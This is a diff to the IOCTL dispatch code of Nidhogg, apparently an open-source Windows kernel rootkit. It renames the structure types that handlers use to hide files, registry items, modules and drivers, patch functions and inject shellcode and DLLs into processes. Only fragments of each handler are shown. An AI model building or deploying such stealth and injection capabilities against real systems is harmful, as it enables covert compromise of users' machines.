@@ -377,7 +377,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_PROTECT_UNPROTECT_FILE:
 	{
-		ProtectedFile protectedFile = { 0 };
+		IoctlFileItem protectedFile = { 0 };
 
 		if (!Features.FileProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
@@ -386,12 +386,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(ProtectedFile))) {
+		if (!IsValidSize(size, sizeof(IoctlFileItem))) {
 			Print(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<ProtectedFile*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlFileItem*>(Irp->AssociatedIrp.SystemBuffer);
 		protectedFile.Protect = data->Protect;
 		SIZE_T filePathLen = wcslen(data->FilePath);
 
@@ -498,7 +498,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_PROTECT_HIDE_REGITEM:
 	{
-		RegItem regItem = { 0 };
+		IoctlRegItem regItem{};
 
 		if (!Features.RegistryFeatures) {
 			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
@@ -558,7 +558,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_UNPROTECT_UNHIDE_REGITEM:
 	{
-		RegItem regItem = { 0 };
+		IoctlRegItem regItem{};
 
 		if (!Features.RegistryFeatures) {
 			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
@@ -672,7 +672,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_PATCH_MODULE:
 	{
-		PatchedModule patchedModule{};
+		IoctlPatchedModule patchedModule{};
 
 		if (!Features.FunctionPatching) {
 			Print(DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n");
@@ -681,12 +681,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(PatchedModule))) {
+		if (!IsValidSize(size, sizeof(IoctlPatchedModule))) {
 			Print(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<PatchedModule*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlPatchedModule*>(Irp->AssociatedIrp.SystemBuffer);
 		patchedModule.Pid = data->Pid;
 		patchedModule.PatchLength = data->PatchLength;
 		SIZE_T strSize = strlen(data->FunctionName);
@@ -730,7 +730,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_HIDE_RESTORE_MODULE:
 	{
-		HiddenModuleInformation hiddenModule{};
+		IoctlHiddenModuleInfo hiddenModule{};
 
 		if (!Features.ModuleHiding) {
 			Print(DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n");
@@ -739,12 +739,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(HiddenModuleInformation))) {
+		if (!IsValidSize(size, sizeof(IoctlHiddenModuleInfo))) {
 			Print(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<HiddenModuleInformation*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlHiddenModuleInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		hiddenModule.Pid = data->Pid;
 		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
 
@@ -785,12 +785,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		wchar_t* driverName = nullptr;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(HiddenDriverInformation))) {
+		if (!IsValidSize(size, sizeof(IoctlHiddenDriverInfo))) {
 			Print(DRIVER_PREFIX "Invalid buffer type.\n");
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<HiddenDriverInformation*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlHiddenDriverInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);
 
 		MemoryAllocator<WCHAR*> driverNameAllocator(&driverName, driverNameSize);
@@ -836,14 +836,14 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_INJECT_SHELLCODE:
 	{
-		ShellcodeInformation shellcodeInfo{};
+		IoctlShellcodeInfo shellcodeInfo{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(ShellcodeInformation))) {
+		if (!IsValidSize(size, sizeof(IoctlShellcodeInfo))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<ShellcodeInformation*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlShellcodeInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		shellcodeInfo.Pid = data->Pid;
 
 		if (!IsValidPid(shellcodeInfo.Pid)) {
@@ -926,14 +926,14 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_INJECT_DLL:
 	{
-		DllInformation dllInfo{};
+		IoctlDllInfo dllInfo{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(DllInformation))) {
+		if (!IsValidSize(size, sizeof(IoctlDllInfo))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<DllInformation*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlDllInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		dllInfo.Pid = data->Pid;
 		dllInfo.Type = data->Type;
 		SIZE_T dllPathSize = strlen(data->DllPath);
